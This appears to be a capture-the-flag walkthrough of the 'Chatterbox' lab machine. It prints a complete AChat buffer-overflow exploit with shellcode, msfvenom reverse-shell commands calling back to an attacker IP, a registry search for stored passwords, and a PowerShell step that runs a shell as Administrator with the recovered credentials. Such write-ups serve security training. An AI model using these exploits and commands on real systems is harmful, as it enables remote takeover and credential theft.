# Chatterbox (Medium)

<figure><img src="../../../.gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h40m00s, deviation: 2h53m13s, median: 5h00m00s
| smb2-security-mode: 
|   210: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-11-06T09:00:26
|_  start_date: 2022-11-06T08:17:56
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-11-06T04:00:23-05:00

```

Enumerated UDP ports:

```
No UDP ports are open
```

Notes:

* 135/RPC is open
* 445/SMB is open
* 9255 & 9256 look very interesting -- Public exploits? Achat chat system

## Enumeration

### Port 445 SMB

* I attemped to list the SMB shares and map them out, but I keep getting a strange error upon doing so...

<figure><img src="../../../.gitbook/assets/image (3) (7).png" alt=""><figcaption></figcaption></figure>

### Port 9255 & 9256 AChat Chat System

<mark style="color:yellow;">Netcat Banner Grabbing Attempt</mark>:

<figure><img src="../../../.gitbook/assets/image (7) (3).png" alt=""><figcaption></figcaption></figure>

* I also tried to navigate to the HTTP port 9255 and 9256 but it wasn't returning results

<mark style="color:yellow;">Searchsploit</mark>:

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

* <mark style="color:yellow;">36025.py Achat Remote Buffer Overflow</mark>

## Exploitation

### <mark style="color:yellow;">Achat is vulnerable to an SEH Buffer Overflow</mark>

Contents of 36025.py:

```
#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  ""
buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += "\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += "\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += "\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += "\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += "\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += "\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += "\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += "\x47\x42\x39\x75\x34\x4a\x42\x69\x6c\x77\x78\x62\x62"
buf += "\x69\x70\x59\x70\x4b\x50\x73\x30\x43\x59\x5a\x45\x50"
buf += "\x31\x67\x50\x4f\x74\x34\x4b\x50\x50\x4e\x50\x34\x4b"
buf += "\x30\x52\x7a\x6c\x74\x4b\x70\x52\x4e\x34\x64\x4b\x63"
buf += "\x42\x4f\x38\x4a\x6f\x38\x37\x6d\x7a\x4d\x56\x4d\x61"
buf += "\x49\x6f\x74\x6c\x4f\x4c\x6f\x71\x33\x4c\x69\x72\x4e"
buf += "\x4c\x4f\x30\x66\x61\x58\x4f\x5a\x6d\x59\x71\x67\x57"
buf += "\x68\x62\x48\x72\x52\x32\x50\x57\x54\x4b\x72\x32\x4e"
buf += "\x30\x64\x4b\x6e\x6a\x4d\x6c\x72\x6b\x70\x4c\x4a\x71"
buf += "\x43\x48\x39\x53\x71\x38\x6a\x61\x36\x71\x4f\x61\x62"
buf += "\x6b\x42\x39\x4f\x30\x4a\x61\x38\x53\x62\x6b\x30\x49"
buf += "\x6b\x68\x58\x63\x4e\x5a\x6e\x69\x44\x4b\x6f\x44\x72"
buf += "\x6b\x4b\x51\x36\x76\x70\x31\x69\x6f\x46\x4c\x57\x51"
buf += "\x48\x4f\x4c\x4d\x6a\x61\x55\x77\x4f\x48\x57\x70\x54"
buf += "\x35\x49\x66\x49\x73\x51\x6d\x7a\x58\x6d\x6b\x53\x4d"
buf += "\x4e\x44\x34\x35\x38\x64\x62\x38\x62\x6b\x52\x38\x6b"
buf += "\x74\x69\x71\x4a\x33\x33\x36\x54\x4b\x7a\x6c\x6e\x6b"
buf += "\x72\x6b\x51\x48\x6d\x4c\x6b\x51\x67\x63\x52\x6b\x49"
buf += "\x74\x72\x6b\x4d\x31\x7a\x30\x44\x49\x51\x34\x6e\x44"
buf += "\x4b\x74\x61\x4b\x51\x4b\x4f\x71\x51\x49\x71\x4a\x52"
buf += "\x31\x49\x6f\x69\x50\x31\x4f\x51\x4f\x6e\x7a\x34\x4b"
buf += "\x6a\x72\x38\x6b\x44\x4d\x71\x4d\x50\x6a\x59\x71\x64"
buf += "\x4d\x35\x35\x65\x62\x4b\x50\x49\x70\x4b\x50\x52\x30"
buf += "\x32\x48\x6c\x71\x64\x4b\x72\x4f\x51\x77\x59\x6f\x79"
buf += "\x45\x45\x6b\x48\x70\x75\x65\x35\x52\x30\x56\x72\x48"
buf += "\x33\x76\x35\x45\x37\x4d\x63\x6d\x49\x6f\x37\x65\x6d"
buf += "\x6c\x6a\x66\x31\x6c\x79\x7a\x51\x70\x4b\x4b\x67\x70"
buf += "\x53\x45\x6d\x35\x55\x6b\x31\x37\x4e\x33\x32\x52\x30"
buf += "\x6f\x42\x4a\x6d\x30\x50\x53\x79\x6f\x37\x65\x70\x63"
buf += "\x53\x31\x72\x4c\x30\x63\x4c\x6e\x70\x65\x32\x58\x50"
buf += "\x65\x6d\x30\x41\x41"


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.129.157.15', 9257)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40"
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
```

* We need to change the command that is being executed as it is simply opening the calculator application... lol

Modified Exploit:

{% code overflow="wrap" %}
```
----SNIP----

msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

----SNIP----
```
{% endcode %}

* Copy this payload and run it in Kali to generate shellcode for your attackbox
* Once generated, copy it into the exploit (replacing the existing shellcode)
* Also, be sure to change the <mark style="color:yellow;">server\_address to your target's address and change the port to 9256</mark>
* Next, start a Netcat listener on port 443
* Run the exploit with Python2 and detonate the SEH bypass BOF

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Local enumeration

* I discovered interesting internal ports with <mark style="color:red;">`netstat -ano`</mark>
  * 445
* Let's look for cleartext passwords
  * <mark style="color:red;">`reg query HKLM /f password /t REG_SZ /s`</mark>
  * <mark style="color:yellow;">DefaultPassword REG\_SZ Welcome1!</mark>
* It appears that we have some creds!
* Let's generate a reverse shell payload with Msfvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 -f exe > shell.exe
```

* Start a nc listener on 443 again
* Create a new object with PowerShell

```
powershell -c "$password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('Administrator', $password);Start-Process -FilePath "shell.exe" -Credential $creds"
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (8).png" alt=""><figcaption></figcaption></figure>
